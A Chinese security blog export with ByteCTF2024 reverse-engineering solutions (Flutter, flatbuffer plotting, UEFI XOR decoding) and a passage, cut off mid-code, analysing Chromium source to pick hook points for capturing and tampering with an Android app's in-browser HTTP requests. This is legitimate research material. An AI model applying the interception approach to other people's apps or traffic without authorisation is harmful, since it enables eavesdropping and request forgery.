[{"categories":null,"content":"碎碎念 好久没打 CTF 感觉能力退化了不少，遇到不是 Android 的题都有点不会做了，甚至卡了一题光荣成为战犯(?)。想了半天为什么 10 解的题我都不会做，后来发现原来现在还有可以直接去除的 ollvm 混淆…. 平时看到的 ollvm 混淆基本都是加强过的根本没法直接跑轮子去除就根本没往这方面想，还是有点太唐了。 ","date":"2024-09-22","objectID":"/byte2024/:1:0","tags":null,"title":"ByteCTF2024 Reverse wps","uri":"/byte2024/"},{"categories":null,"content":"babyAPK 上来肯定是先把 Android 秒了(x 经典 flutter，直接跑一下 blutter。 main.dart 里可以看到一个明显的相关逻辑： _ test(/* No info */) { // ** addr: 0x264c0c, size: 0x17c // 0x264c0c: EnterFrame // 0x264c0c: stp fp, lr, [SP, #-0x10]! // 0x264c10: mov fp, SP // 0x264c14: AllocStack(0x28) // 0x264c14: sub SP, SP, #0x28 // 0x264c18: CheckStackOverflow // 0x264c18: ldr x16, [THR, #0x38] ; THR::stack_limit // 0x264c1c: cmp SP, x16 // 0x264c20: b.ls #0x264d78 // 0x264c24: LoadField: r0 = r1-\u003efield_13 // 0x264c24: ldur w0, [x1, #0x13] // 0x264c28: DecompressPointer r0 // 0x264c28: add x0, x0, HEAP, lsl #32 // 0x264c2c: LoadField: r1 = r0-\u003efield_27 // 0x264c2c: ldur w1, [x0, #0x27] // 0x264c30: DecompressPointer r1 // 0x264c30: add x1, x1, HEAP, lsl #32 // 0x264c34: LoadField: r0 = r1-\u003efield_7 // 0x264c34: ldur w0, [x1, #7] // 0x264c38: DecompressPointer r0 // 0x264c38: add x0, x0, HEAP, lsl #32 // 0x264c3c: mov x1, x0 // 0x264c40: stur x0, [fp, #-8] // 0x264c44: r2 = \"ByteCTF{\" // 0x264c44: add x2, PP, #0xc, lsl #12 ; [pp+0xcfb0] \"ByteCTF{\" // 0x264c48: ldr x2, [x2, #0xfb0] // 0x264c4c: r4 = const [0, 0x2, 0, 0x2, null] // 0x264c4c: ldr x4, [PP, #0x170] ; [pp+0x170] List(5) [0, 0x2, 0, 0x2, Null] // 0x264c50: r0 = startsWith() // 0x264c50: bl #0x198d18 ; [dart:core] _StringBase::startsWith // 0x264c54: tbnz w0, #4, #0x264d58 // 0x264c58: ldur x1, [fp, #-8] // 0x264c5c: LoadField: r0 = r1-\u003efield_7 // 0x264c5c: ldur w0, [x1, #7] // 0x264c60: r2 = LoadInt32Instr(r0) // 0x264c60: sbfx x2, x0, #1, #0x1f // 0x264c64: stur x2, [fp, #-0x10] // 0x264c68: sub x0, x2, #1 // 0x264c6c: lsl x3, x0, #1 // 0x264c70: stp x3, x1, [SP, #8] // 0x264c74: r16 = \"}\" // 0x264c74: add x16, PP, #8, lsl #12 ; [pp+0x8a40] \"}\" // 0x264c78: ldr x16, [x16, #0xa40] // 0x264c7c: str x16, [SP] // 0x264c80: r0 = _substringMatches() // 0x264c80: bl #0x198df8 ; [dart:core] _StringBase::_substringMatches // 0x264c84: tbnz w0, #4, #0x264d58 // 0x264c88: ldur x0, [fp, #-0x10] // 0x264c8c: cmp x0, #0x2d // 0x264c90: b.ne #0x264d58 // 0x264c94: ldur x1, [fp, #-8] // 0x264c98: r0 = LoadClassIdInstr(r1) // 0x264c98: ldur x0, [x1, #-1] // 0x264c9c: ubfx x0, x0, #0xc, #0x14 // 0x264ca0: r2 = \"{\" // 0x264ca0: add x2, PP, #8, lsl #12 ; [pp+0x8a18] \"{\" // 0x264ca4: ldr x2, [x2, #0xa18] // 0x264ca8: r0 = GDT[cid_x0 + -0x1000]() // 0x264ca8: sub lr, x0, #1, lsl #12 // 0x264cac: ldr lr, [x21, lr, lsl #3] // 0x264cb0: blr lr // 0x264cb4: mov x2, x0 // 0x264cb8: LoadField: r0 = r2-\u003efield_b // 0x264cb8: ldur w0, [x2, #0xb] // 0x264cbc: r1 = LoadInt32Instr(r0) // 0x264cbc: sbfx x1, x0, #1, #0x1f // 0x264cc0: mov x0, x1 // 0x264cc4: r1 = 1 // 0x264cc4: movz x1, #0x1 // 0x264cc8: cmp x1, x0 // 0x264ccc: b.hs #0x264d80 // 0x264cd0: LoadField: r0 = r2-\u003efield_f // 0x264cd0: ldur w0, [x2, #0xf] // 0x264cd4: DecompressPointer r0 // 0x264cd4: add x0, x0, HEAP, lsl #32 // 0x264cd8: LoadField: r1 = r0-\u003efield_13 // 0x264cd8: ldur w1, [x0, #0x13] // 0x264cdc: DecompressPointer r1 // 0x264cdc: add x1, x1, HEAP, lsl #32 // 0x264ce0: r0 = LoadClassIdInstr(r1) // 0x264ce0: ldur x0, [x1, #-1] // 0x264ce4: ubfx x0, x0, #0xc, #0x14 // 0x264ce8: r2 = \"}\" // 0x264ce8: add x2, PP, #8, lsl #12 ; [pp+0x8a40] \"}\" // 0x264cec: ldr x2, [x2, #0xa40] // 0x264cf0: r0 = GDT[cid_x0 + -0x1000]() // 0x264cf0: sub lr, x0, #1, lsl #12 // 0x264cf4: ldr lr, [x21, lr, lsl #3] // 0x264cf8: blr lr // 0x264cfc: mov x2, x0 // 0x264d00: LoadField: r0 = r2-\u003efield_b // 0x264d00: ldur w0, [x2, #0xb] // 0x264d04: r1 = LoadInt32Instr(r0) // 0x264d04: sbfx x1, x0, #1, #0x1f // 0x264d08: mov x0, x1 // 0x264d0c: r1 = 0 // 0x264d0c: movz x1, #0 // 0x264d10: cmp x1, x0 // 0x264d14: b.hs #0x264d84 // 0x264d18: LoadField: r0 = r2-\u003efield_f // 0x264d18: ldur w0, [x2, #0xf] // 0x264d1c: DecompressPointer r0 // 0x264d1c: add x0, x0, HEAP, lsl #32 // 0x264d20: LoadField: r1 = r0-\u003efield_f // 0x264d20: ldur w1, [x0, #0xf] // 0x264d24: DecompressPointer r1 // 0x264d24: add x1, x1, HEAP, lsl #32 // 0x264d28: r0 = m3N4B5V6() // 0x264d28: bl #0x265088 ; [package:babyapk/src/rust/api/si","date":"2024-09-22","objectID":"/byte2024/:2:0","tags":null,"title":"ByteCTF2024 Reverse wps","uri":"/byte2024/"},{"categories":null,"content":"ByteBuffer 不知道什么是 flatbuffer，但是一看有边有点多半就是画图，那么需要的信息就是边连接的两个点和点的坐标。直接大眼观察一下哪个像就可以了。大概内存布局： Edge(3b0h) 0x10000000: pivot 0x77: 左端点编号 0x75: 右端点编号 0x4: 不知道 0x9: 名字长度 string: Edge #103(8byte对齐） 0xfffff1cc: 不知道 Dot(1234h) 0x640: x坐标 0x4b: y坐标 0x4: 不知道 0x8: 名字长度 string: Dot #120(8byte对齐) 0xfffff2c8: 不知道 直接画图。 EDGE_START = 0x3b0 EDGE_END = 0x1234 DOT_START = 0x1234 DOT_END = 0x1fb0 EDGE_SIZE = 0x24 DOT_SIZE = 0x20 DOT_CNT = 120 EDGE_CNT = 103 with open(\"ByteBuffer.bin\", \"rb\") as f: c = f.read() dots = [None for i in range(DOT_CNT+1)] index = DOT_CNT i = DOT_START while i \u003c DOT_END: x = int.from_bytes(c[i:i+4], 'little') y = int.from_bytes(c[i+4:i+8], 'little') dots[index] = (x, y) index -= 1 i += 16 while int.from_bytes(c[i:i+4], 'little') != 4 and i \u003c DOT_END: i += 1 i -= 8 print(dots) edges = [] i = EDGE_START while i \u003c EDGE_END: print(c[i+4:i+12]) x = int.from_bytes(c[i+4:i+8], 'little') y = int.from_bytes(c[i+8:i+12], 'little') edges.append((x, y)) i += 20 while int.from_bytes(c[i:i+4], 'little') != 0x1000000 and i \u003c EDGE_END: i += 1 print(edges) import matplotlib.pyplot as plt dots = [None, (75, 75), (25, 75), (75, 25), (25, 25), (25, 125), (75, 125), (100, 75), (100, 25), (150, 25), (150, 75), (100, 125), (150, 125), (175, 75), (175, 25), (225, 25), (225, 75), (225, 125), (250, 75), (250, 25), (300, 25), (300, 75), (250, 125), (300, 125), (325, 75), (325, 25), (375, 75), (375, 25), (375, 125), (400, 75), (400, 25), (450, 25), (450, 75), (400, 125), (450, 125), (475, 75), (475, 25), (475, 125), (525, 75), (550, 75), (550, 25), (600, 25), (600, 75), (550, 125), (600, 125), (625, 75), (625, 25), (675, 25), (675, 75), (625, 125), (675, 125), (700, 75), (700, 25), (750, 25), (750, 75), (750, 125), (700, 125), (775, 75), (775, 25), (825, 25), (825, 75), (775, 125), (825, 125), (850, 75), (850, 25), (900, 25), (900, 75), (850, 125), (900, 125), (925, 75), (925, 25), (975, 25), (975, 75), (925, 125), (975, 125), (1000, 75), (1000, 25), (1050, 25), (1050, 75), (1000, 125), (1050, 125), (1075, 75), (1075, 25), (1125, 25), (1125, 75), (1125, 125), (1075, 125), (1150, 75), (1150, 25), (1200, 25), (1200, 75), (1200, 125), (1225, 75), (1225, 25), (1225, 125), (1275, 75), (1300, 75), (1300, 25), (1350, 25), (1350, 75), (1300, 125), (1350, 125), (1375, 75), (1375, 25), (1425, 25), (1425, 75), (1375, 125), (1425, 125), (1450, 75), (1450, 25), (1500, 25), (1500, 75), (1450, 125), (1500, 125), (1525, 75), (1525, 25), (1575, 25), (1575, 75), (1525, 125), (1575, 125), (1600, 75)] edges = [(119, 117), (119, 118), (117, 114), (116, 115), (115, 114), (113, 111), (113, 112), (112, 108), (111, 108), (110, 109), (109, 108), (107, 105), (107, 106), (106, 102), (105, 102), (105, 104), (104, 103), (103, 102), (101, 99), (101, 100), (99, 96), (98, 97), (97, 96), (94, 92), (93, 92), (91, 90), (90, 89), (89, 88), (86, 81), (86, 85), (85, 84), (84, 83), (83, 82), (82, 81), (80, 78), (80, 79), (78, 75), (78, 77), (77, 76), (76, 75), (74, 73), (73, 69), (72, 69), (72, 71), (71, 70), (68, 66), (68, 67), (66, 63), (66, 65), (65, 64), (64, 63), (62, 60), (62, 61), (61, 57), (60, 57), (59, 58), (58, 57), (56, 51), (56, 55), (55, 54), (54, 53), (53, 52), (52, 51), (50, 48), (50, 49), (48, 45), (47, 46), (46, 45), (44, 42), (44, 43), (43, 39), (42, 39), (42, 41), (41, 40), (40, 39), (37, 35), (36, 35), (34, 33), (33, 29), (32, 29), (32, 31), (31, 30), (28, 26), (27, 26), (26, 24), (25, 24), (23, 21), (23, 22), (21, 18), (20, 19), (19, 18), (17, 16), (16, 15), (15, 14), (12, 11), (11, 7), (10, 7), (10, 9), (9, 8), (6, 1), (6, 5), (4, 3), (3, 1), (2, 1)] for u, v in edges: plt.plot([dots[u][0], dots[v][0]], [dots[u][1], dots[v][1]], '-', color='r') plt.show() 这题之所以放在 Reverse 标签内大概是因为最后需要把图翻转 180 度再水平翻转吧。 ","date":"2024-09-22","objectID":"/byte2024/:3:0","tags":null,"title":"ByteCTF2024 Reverse wps","uri":"/byte2024/"},{"categories":null,"content":"ByteKit 给了一个 qemu 镜像和 bios，先看看 getflag.sh #!/bin/bash BYTECTF_INPUT_GUID=93e91ed6-1a7a-46a1-b880-c5d281700ea2 BYTECTF_OUTPUT_GUID=93e91ed6-1a7a-46a1-b880-c5c281700ea2 BYTECTF_INPUT_VAR_FILE=\"/sys/firmware/efi/efivars/ByteCTFIn-$BYTECTF_INPUT_GUID\" BYTECTF_OUTPUT_VAR_FILE=\"/sys/firmware/efi/efivars/ByteCTFOut-$BYTECTF_OUTPUT_GUID\" if [ \"$1\" == \"\" ]; then echo \"$0\u003cyour input\u003e\" exit 1 fi input=$1 echo \"your input is $input\" if [ -f $BYTECTF_OUTPUT_VAR_FILE ]; then flag1=$input flag2=`cat $BYTECTF_OUTPUT_VAR_FILE | base64 | cut -c -24` echo \"ByteCTF{$flag1$flag2}\" chattr -i $BYTECTF_OUTPUT_VAR_FILE rm -f $BYTECTF_OUTPUT_VAR_FILE exit 0 fi if [ -f $BYTECTF_INPUT_VAR_FILE ]; then chattr -i $BYTECTF_INPUT_VAR_FILE rm -f $BYTECTF_INPUT_VAR_FILE fi echo -en \"\\x07\\x00\\x00\\x00$input\" | sudo tee $BYTECTF_INPUT_VAR_FILE \u003e /dev/null echo \"system will reboot in 10 seconds\" sh -c \"sleep 10; reboot\" \u0026 根据题目描述，运行这个脚本设置了 ByteCTFIn 之后重启，根据有没有 ByteCTFOut 来判定 flag 是否正确。这里写的是 /efi/efivars，可以判断和 uefi 相关，应该是在 bios.bin 里做的校验。用 UEFI Tools 解包了一下可以发现下面两个有趣的东西： VSS entry | Auth | 00004F64 | 00000055 | C3C482FF | --- 93E91ED6-1A7A-46A1-B880-C5D281700EA2 | ByteCTFIn File | DXE driver | N/A | 0001CF4E | 6489F051 | ------ FB08605D-6B57-409B-A195-C67992ECF0EE | ByteKitLoaderDxe dump 出 ByteKitLoaderDxe 之后直接逆向分析，有 ollvm 混淆，crc32 和 smc 的异或混在一起，已经逆了两个题神志不清的我直接忽略了 smc 的那个异或干瞪了好一会啥都没看出来，又因为完全没有接触过 uefi 相关的东西根本不会调试，遂躺床上昏迷成为战犯。赛后经好心人提点知道这个 ollvm 可以直接用 d810 去除（真没想到 2024 年了还有能被完美去除的 ollvm 混淆…） 去除混淆后可以发现是一个简单的异或解密了另一个 module 然后 load 进来执行，里面的逻辑也是简单异或。 key = [0x62, 1, 0x0B, 0x79, 2, 3, 0x74, 3, 7, 0x65, 4, 0x0E, 0x64, 5, 0x0D, 0x61, 6, 0x0A, 0x6E, 7, 0x0F, 0x63, 8, 0x0C, 0x65, 9, 0x0A] cip = [ 0x4B, 0x27, 0x42, 0x55, 0x48, 0x6E, 0x41, 0x29, 0x1F, 0x5E, 0x04, 0x04, 0x6B, 0x3E, 0x57, 0x5F, 0x08, 0x07, 0x5F, 0x3A, 0x31, 0x17, 0x40, 0x30, 0x5F, 0x7A, 0x75, 0x67, 0x36, 0x36, 0x36, 0x36] for i in range(0, len(key), 3): for j in range(key[i+1], key[i+1]+key[i+2]): cip[j] ^= key[i] print(bytearray(cip)) ","date":"2024-09-22","objectID":"/byte2024/:4:0","tags":null,"title":"ByteCTF2024 Reverse wps","uri":"/byte2024/"},{"categories":null,"content":"前言 最近正好做到了针对安卓某 APP 内置浏览器抓包相关的东西，顺手记录一下。 目前已有的抓包解决方式可以参考 r0capture 的这个图： https://github.com/r0ysue/r0capture/blob/main/pic/summary2.jpg 其中最为方便的是 HOOK 抓包，不需要配置或导入证书即可获得数据。网络上现有的传统的解决方案为寻找 SSL 库里的 SSL_read 和 SSL_write 函数进行 hook 抓包。这种方法确实可以实现通杀且可以抓到数据，即使是在集成了自定义 SSL 库的内置浏览器中 API 定位也相对简单，但还是存在以下缺陷： 数据包碎片化：由于 hook 的位置较为底层，网络通信较为紊乱，这种方式抓取的流量一般需要借助流量分析软件（如 wireshark）进行进一步分析，在 HTTP2.0 协议的加成下，多个会话的流量占用同一个 TCP 连接进行传输，这使得读写流量的拼接更为复杂繁琐，这对于需要实时批量获取数据的场景是致命的。 无法实现篡改：由于上面的数据包碎片化问题，在攻击者视角下，运用该方法 hook 获取发送的数据包时无法实现实时的数据包篡改和伪造。 针对上述场景，针对内置浏览器使用的 chromium 内核进行了粗略的分析，考虑在浏览器较为上层的位置截取完整的包数据。 ","date":"2024-05-28","objectID":"/chromium/:1:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"Chromium 网络栈 这里首先需要拿出一个经典的八股面试题：在浏览器输入URL 地址回车后，发生了什么？ 我们并不关心无聊的八股答案，这里我们主要关注的是 Chromium 具体如何发送一个 HTTP 请求。 这里有一篇文章，懒得复读了： https://www.cnblogs.com/bigben0123/p/12650519.html 虽然这篇文章完全忽略了对 Cache 相关的操作，但是正好我们也不关心那部分内容。 我们的目的是抓到完整的、全量的请求，所以我们需要找一个请求过程中符合以下条件的时机： 请求已经被构建好 请求还没有被交给具体的传输流 前者会导致我们无法获取完整的请求，而后者会导致请求已经根据请求协议被分流，我们只能拿到某种特定协议下的请求包而丢失其他请求。 由于确认第一点十分麻烦，所以我们期望找到的是满足第二点的最下层位置，即请求被交给传输流的前一刻。 经过几小时的坐牢我定位到了类 HttpNetworkTransaction。 https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_network_transaction.cc?q=HttpNetworkTransaction\u0026ss=chromium%2Fchromium 这里我们比较关注的是 HttpNetworkTransaction 发送请求的流程： int HttpNetworkTransaction::DoLoop(int result) { DCHECK(next_state_ != STATE_NONE); int rv = result; do { State state = next_state_; next_state_ = STATE_NONE; switch (state) { case STATE_NOTIFY_BEFORE_CREATE_STREAM: DCHECK_EQ(OK, rv); rv = DoNotifyBeforeCreateStream(); break; case STATE_CREATE_STREAM: DCHECK_EQ(OK, rv); rv = DoCreateStream(); break; case STATE_CREATE_STREAM_COMPLETE: rv = DoCreateStreamComplete(rv); break; case STATE_INIT_STREAM: DCHECK_EQ(OK, rv); rv = DoInitStream(); break; case STATE_INIT_STREAM_COMPLETE: rv = DoInitStreamComplete(rv); break; case STATE_CONNECTED_CALLBACK: rv = DoConnectedCallback(); break; case STATE_CONNECTED_CALLBACK_COMPLETE: rv = DoConnectedCallbackComplete(rv); break; case STATE_GENERATE_PROXY_AUTH_TOKEN: DCHECK_EQ(OK, rv); rv = DoGenerateProxyAuthToken(); break; case STATE_GENERATE_PROXY_AUTH_TOKEN_COMPLETE: rv = DoGenerateProxyAuthTokenComplete(rv); break; case STATE_GENERATE_SERVER_AUTH_TOKEN: DCHECK_EQ(OK, rv); rv = DoGenerateServerAuthToken(); break; case STATE_GENERATE_SERVER_AUTH_TOKEN_COMPLETE: rv = DoGenerateServerAuthTokenComplete(rv); break; case STATE_INIT_REQUEST_BODY: DCHECK_EQ(OK, rv); rv = DoInitRequestBody(); break; case STATE_INIT_REQUEST_BODY_COMPLETE: rv = DoInitRequestBodyComplete(rv); break; case STATE_BUILD_REQUEST: DCHECK_EQ(OK, rv); net_log_.BeginEvent(NetLogEventType::HTTP_TRANSACTION_SEND_REQUEST); rv = DoBuildRequest(); break; case STATE_BUILD_REQUEST_COMPLETE: rv = DoBuildRequestComplete(rv); break; case STATE_SEND_REQUEST: DCHECK_EQ(OK, rv); rv = DoSendRequest(); break; case STATE_SEND_REQUEST_COMPLETE: rv = DoSendRequestComplete(rv); net_log_.EndEventWithNetErrorCode( NetLogEventType::HTTP_TRANSACTION_SEND_REQUEST, rv); break; case STATE_READ_HEADERS: DCHECK_EQ(OK, rv); net_log_.BeginEvent(NetLogEventType::HTTP_TRANSACTION_READ_HEADERS); rv = DoReadHeaders(); break; case STATE_READ_HEADERS_COMPLETE: rv = DoReadHeadersComplete(rv); net_log_.EndEventWithNetErrorCode( NetLogEventType::HTTP_TRANSACTION_READ_HEADERS, rv); break; case STATE_READ_BODY: DCHECK_EQ(OK, rv); net_log_.BeginEvent(NetLogEventType::HTTP_TRANSACTION_READ_BODY); rv = DoReadBody(); break; case STATE_READ_BODY_COMPLETE: rv = DoReadBodyComplete(rv); net_log_.EndEventWithNetErrorCode( NetLogEventType::HTTP_TRANSACTION_READ_BODY, rv); break; case STATE_DRAIN_BODY_FOR_AUTH_RESTART: DCHECK_EQ(OK, rv); net_log_.BeginEvent( NetLogEventType::HTTP_TRANSACTION_DRAIN_BODY_FOR_AUTH_RESTART); rv = DoDrainBodyForAuthRestart(); break; case STATE_DRAIN_BODY_FOR_AUTH_RESTART_COMPLETE: rv = DoDrainBodyForAuthRestartComplete(rv); net_log_.EndEventWithNetErrorCode( NetLogEventType::HTTP_TRANSACTION_DRAIN_BODY_FOR_AUTH_RESTART, rv); break; default: NOTREACHED_IN_MIGRATION() \u003c\u003c \"bad state\"; rv = ERR_FAILED; break; } } while (rv != ERR_IO_PENDING \u0026\u0026 next_state_ != STATE_NONE); return rv; } 这个流程根据状态包含了所有请求的流程，在不发生错误或重连的情况下你可以认为流程是顺序进行的（其实并不。 ","date":"2024-05-28","objectID":"/chromium/:2:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"RequestBody 获取 由于我们的目标是一个浏览器而不是一个网络库，在实现上 chromium 也没有必要在某个地方存储明文的整个网络请求，更多的是将 Headers、Body 等数据分散地组合在结构体里，将这些东西交给具体的传输流进行组装和传输。 在这种情况下，RequestBody 是我们最容易获取的字段。和其他我们需要的字段相比，RequestBody 直接来自前端应用。如果一个请求由 Chromium 进行创建，那么他一定是一个不含 Body 的 GET 请求，一般用于请求资源，这类资源一定不含邮 RequestBody。因此，当 RequestBody 存在的场合，该请求一定由前端主动发出，也就是说 RequestBody 的生成一定在 Chromium 之外，在进入 Chromium 时已经被完整传入。 在 Chromium 中，具体表现为存在一个类 UploadDataStream 在请求被创建开始时即被传入，一直层层下传到底层传输。 很遗憾，在我认为应该有 Body 信息的地方没有该信息。 int HttpNetworkTransaction::DoInitRequestBody() { next_state_ = STATE_INIT_REQUEST_BODY_COMPLETE; int rv = OK; if (request_-\u003eupload_data_stream) rv = request_-\u003eupload_data_stream-\u003eInit( base::BindOnce(\u0026HttpNetworkTransaction::OnIOComplete, base::Unretained(this)), net_log_); return rv; } 已知该 upload_data_stream 在传入 HttpNetworkTransaction 时就已经携带了我们想要的信息，或者我们想要的信息可以通过该结构读取。在实现具体的 hook 时，主动从一个 stream 里读数据是一个糟糕的选择：首先需要进一步分析这个数据流的工作方式，其次不能保证这个读行为是否会把数据取走导致 chromium 自己获取不到这部分数据。 因此，我们转而关注在传输流发送请求的时候如何使用这个 data_stream。 虽然前文说根据协议不同会走不同的传输流，但是他们对这个结构体的操作一定是相同的。这里选用最基础的 HTTP/1.1 协议进行分析。随机选取一个受害者类 HttpStreamParser。https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_stream_parser.cc int HttpStreamParser::DoLoop(int result) { do { DCHECK_NE(ERR_IO_PENDING, result); DCHECK_NE(STATE_DONE, io_state_); DCHECK_NE(STATE_NONE, io_state_); State state = io_state_; io_state_ = STATE_NONE; switch (state) { case STATE_SEND_HEADERS: DCHECK_EQ(OK, result); result = DoSendHeaders(); DCHECK_NE(STATE_NONE, io_state_); break; case STATE_SEND_HEADERS_COMPLETE: result = DoSendHeadersComplete(result); DCHECK_NE(STATE_NONE, io_state_); break; case STATE_SEND_BODY: DCHECK_EQ(OK, result); result = DoSendBody(); DCHECK_NE(STATE_NONE, io_state_); break; case STATE_SEND_BODY_COMPLETE: result = DoSendBodyComplete(result); DCHECK_NE(STATE_NONE, io_state_); break; case STATE_SEND_REQUEST_READ_BODY_COMPLETE: result = DoSendRequestReadBodyComplete(result); DCHECK_NE(STATE_NONE, io_state_); break; case STATE_SEND_REQUEST_COMPLETE: result = DoSendRequestComplete(result); break; case STATE_READ_HEADERS: net_log_.BeginEvent(NetLogEventType::HTTP_STREAM_PARSER_READ_HEADERS); DCHECK_GE(result, 0); result = DoReadHeaders(); break; case STATE_READ_HEADERS_COMPLETE: result = DoReadHeadersComplete(result); net_log_.EndEventWithNetErrorCode( NetLogEventType::HTTP_STREAM_PARSER_READ_HEADERS, result); break; case STATE_READ_BODY: DCHECK_GE(result, 0); result = DoReadBody(); break; case STATE_READ_BODY_COMPLETE: result = DoReadBodyComplete(result); break; default: NOTREACHED_IN_MIGRATION(); break; } } while (result != ERR_IO_PENDING \u0026\u0026 (io_state_ != STATE_DONE \u0026\u0026 io_state_ != STATE_NONE)); return result; } 关心的 SendBody int HttpStreamParser::DoSendBody() { if (request_body_send_buf_-\u003eBytesRemaining() \u003e 0) { io_state_ = STATE_SEND_BODY_COMPLETE; return stream_socket_-\u003eWrite( request_body_send_buf_.get(), request_body_send_buf_-\u003eBytesRemaining(), io_callback_, NetworkTrafficAnnotationTag(traffic_annotation_)); } if (upload_data_stream_-\u003eis_chunked() \u0026\u0026 sent_last_chunk_) { // Finished sending the request. io_state_ = STATE_SEND_REQUEST_COMPLETE; return OK; } request_body_read_buf_-\u003eClear(); io_state_ = STATE_SEND_REQUEST_READ_BODY_COMPLETE; return upload_data_stream_-\u003eRead( request_body_read_buf_.get(), request_body_read_buf_-\u003ecapacity(), base::BindOnce(\u0026HttpStreamParser::OnIOComplete, weak_ptr_factory_.GetWeakPtr())); } 可以发现当一个传输流准备发送 RequestBody 时，会先调用 UploadDataStream::Read 读取 RequestBody 再进行上传。这里产生了我们的第一个受害者函数： int UploadDataStream::Read(IOBuffer* buf, int buf_len, CompletionOnceCallback callback) { DCHECK(!callback.is_null() || IsInMemory()); DCHECK(initialized_successfully_); DCHECK_GT(buf_len, 0); net_log_.BeginEvent(NetLogEventType::UPLOAD_DATA_STREAM_READ, [\u0026] { return CreateReadInfoParams(current_position_); }); int result = 0; if (!is_eof_) result = ReadInternal(buf, buf_len); if (result == ERR_IO_PENDING) { DCHECK(!IsInMemory()); callback_ = std::move(callback); } else { OnReadCompleted(result); } return","date":"2024-05-28","objectID":"/chromium/:3:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"RequestHeader 获取 还是从 DoLoop 开始分析： int HttpNetworkTransaction::DoBuildRequest() { next_state_ = STATE_BUILD_REQUEST_COMPLETE; headers_valid_ = false; // This is constructed lazily (instead of within our Start method), so that // we have proxy info available. if (request_headers_.IsEmpty()) { bool using_http_proxy_without_tunnel = UsingHttpProxyWithoutTunnel(); return BuildRequestHeaders(using_http_proxy_without_tunnel); } return OK; } int HttpNetworkTransaction::BuildRequestHeaders( bool using_http_proxy_without_tunnel) { request_headers_.SetHeader(HttpRequestHeaders::kHost, GetHostAndOptionalPort(request_-\u003eurl)); // For compat with HTTP/1.0 servers and proxies: if (using_http_proxy_without_tunnel) { request_headers_.SetHeader(HttpRequestHeaders::kProxyConnection, \"keep-alive\"); } else { request_headers_.SetHeader(HttpRequestHeaders::kConnection, \"keep-alive\"); } // Add a content length header? if (request_-\u003eupload_data_stream) { if (request_-\u003eupload_data_stream-\u003eis_chunked()) { request_headers_.SetHeader( HttpRequestHeaders::kTransferEncoding, \"chunked\"); } else { request_headers_.SetHeader( HttpRequestHeaders::kContentLength, base::NumberToString(request_-\u003eupload_data_stream-\u003esize())); } } else if (request_-\u003emethod == \"POST\" || request_-\u003emethod == \"PUT\") { // An empty POST/PUT request still needs a content length. As for HEAD, // IE and Safari also add a content length header. Presumably it is to // support sending a HEAD request to an URL that only expects to be sent a // POST or some other method that normally would have a message body. // Firefox (40.0) does not send the header, and RFC 7230 \u0026 7231 // specify that it should not be sent due to undefined behavior. request_headers_.SetHeader(HttpRequestHeaders::kContentLength, \"0\"); } // Honor load flags that impact proxy caches. if (request_-\u003eload_flags \u0026 LOAD_BYPASS_CACHE) { request_headers_.SetHeader(HttpRequestHeaders::kPragma, \"no-cache\"); request_headers_.SetHeader(HttpRequestHeaders::kCacheControl, \"no-cache\"); } else if (request_-\u003eload_flags \u0026 LOAD_VALIDATE_CACHE) { request_headers_.SetHeader(HttpRequestHeaders::kCacheControl, \"max-age=0\"); } if (ShouldApplyProxyAuth() \u0026\u0026 HaveAuth(HttpAuth::AUTH_PROXY)) auth_controllers_[HttpAuth::AUTH_PROXY]-\u003eAddAuthorizationHeader( \u0026request_headers_); if (ShouldApplyServerAuth() \u0026\u0026 HaveAuth(HttpAuth::AUTH_SERVER)) auth_controllers_[HttpAuth::AUTH_SERVER]-\u003eAddAuthorizationHeader( \u0026request_headers_); if (net::features::kIpPrivacyAddHeaderToProxiedRequests.Get() \u0026\u0026 proxy_info_.is_for_ip_protection()) { CHECK(!proxy_info_.is_direct() || net::features::kIpPrivacyDirectOnly.Get()); if (!proxy_info_.is_direct()) { request_headers_.SetHeader(\"IP-Protection\", \"1\"); } } request_headers_.MergeFrom(request_-\u003eextra_headers); if (modify_headers_callbacks_) { modify_headers_callbacks_.Run(\u0026request_headers_); } response_.did_use_http_auth = request_headers_.HasHeader(HttpRequestHeaders::kAuthorization) || request_headers_.HasHeader(HttpRequestHeaders::kProxyAuthorization); return OK; } 其实这里很明显了，我们的下一个受害者函数是 HttpRequestHeaders::SetHeader。 void HttpRequestHeaders::SetHeader(std::string_view key, std::string_view value) { SetHeader(key, std::string(value)); } ","date":"2024-05-28","objectID":"/chromium/:4:0","tags":null,"title":"Chromium 内核 hook 抓包实战记录","uri":"/chromium/"},{"categories":null,"content":"Request 组装 在前文我们获取了所有的 Request 信息，但是这两个信息获取的位置可以说是毫不相关，甚至所有的 RequestHeaders 都是碎片。我们需要一个方法把这些信息组装起来。 这里有一个好东西： int HttpNetworkTransaction::Start(const HttpRequestInfo* request_info, CompletionOnceCallback callback, const NetLogWithSource\u0026 net_log) { if (request_info-\u003eload_flags \u0026 LOAD_ONLY_FROM_CACHE) return ERR_CACHE_MISS; DCHECK(request_info-\u003etraffic_annotation.is_valid()); DCHECK(request_info-\u003eIsConsistent()); net_log_ = net_log; request_ = request_info; url_ = request_-\u003eurl; network_anonymization_key_ = request_-\u003enetwork_anonymization_key; #if BUILDFLAG(ENABLE_REPORTING) // Store values for later use in NEL report generation. request_method_ = request_-\u003emethod; request_-\u003eextra_headers.GetHeader(HttpRequestHeaders::kReferer, \u0026request_referrer_); request_-\u003eextra_headers.GetHeader(HttpRequestHeaders::kUserAgent, \u0026request_user_agent_); request_reporting_upload_depth_ = request_-\u003ereporting_upload_depth; start_timeticks_ = base::TimeTicks::Now(); #endif // BUILDFLAG(ENABLE_REPORTING) if (request_-\u003eidempotency == IDEMPOTENT || (request_-\u003eidempotency == DEFAULT_IDEMPOTENCY \u0026\u0026 HttpUtil::IsMethodSafe(request_info-\u003emethod))) { can_send_early_data_ = true; } if (request_-\u003eload_flags \u0026 LOAD_PREFETCH) { response_.unused_since_prefetch = true; } if (request_-\u003eload_flags \u0026 LOAD_RESTRICTED_PREFETCH) { DCHECK(response_.unused_since_prefetch); response_.restricted_prefetch = true; } next_state_ = STATE_NOTIFY_BEFORE_CREATE_STREAM; int rv = DoLoop(OK); if (rv == ERR_IO_PENDING) callback_ = std::move(callback); // This always returns ERR_IO_PENDING because DoCreateStream() does, but // 